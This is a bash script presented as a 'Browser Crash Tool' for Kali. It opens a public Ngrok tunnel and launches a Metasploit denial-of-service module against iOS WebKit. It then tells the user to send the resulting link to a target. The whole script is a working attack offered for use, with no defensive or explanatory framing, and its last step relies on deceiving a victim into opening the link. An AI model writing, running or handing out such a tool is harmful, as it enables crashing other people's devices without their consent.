#!/bin/bash

# Title and banner
clear
echo "============================================"
echo "         Browser Crash Tool - Kali           "
echo "============================================"
echo "This tool uses Metasploit to exploit a vulnerability in iOS WebKit."
echo "Ensure you have Metasploit and Ngrok installed!"
echo ""

# Check if Metasploit is installed
if ! command -v msfconsole &> /dev/null
then
    echo "[ERROR] Metasploit is not installed. Please install it and try again."
    exit 1
fi

# Check if Ngrok is installed
if ! command -v ngrok &> /dev/null
then
    echo "[ERROR] Ngrok is not installed. Installing Ngrok..."
    sudo apt-get install ngrok -y
fi

# Check if the Ngrok token is set
if ! grep -q "authtoken:" ~/.ngrok2/ngrok.yml
then
    echo "[ERROR] Ngrok token not found. Please save your token using:"
    echo "       ngrok authtoken <your-token>"
    exit 1
fi

# Start Ngrok to get a public URL
echo "[INFO] Starting Ngrok on port 80..."
ngrok http 80 > /dev/null &
sleep 5

# Get the public Ngrok URL
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -oP '(?<=public_url":")https://[^"]+')
if [ -z "$NGROK_URL" ]; then
    echo "[ERROR] Failed to get Ngrok URL."
    exit 1
fi
echo "[INFO] Ngrok URL: $NGROK_URL"

# Launch Metasploit with the WebKit module
echo "[INFO] Launching Metasploit to exploit WebKit vulnerability..."
msfconsole -q -x "use auxiliary/dos/apple_ios/webkit_backdrop_filter_blur; set LHOST 127.0.0.1; set SRVPORT 80; set URIPATH /; run -j"

# Inform the user
echo "[INFO] The browser crash is live! Send the following link to the target:"
echo "      $NGROK_URL/"
echo "[INFO] Press Ctrl+C to stop."
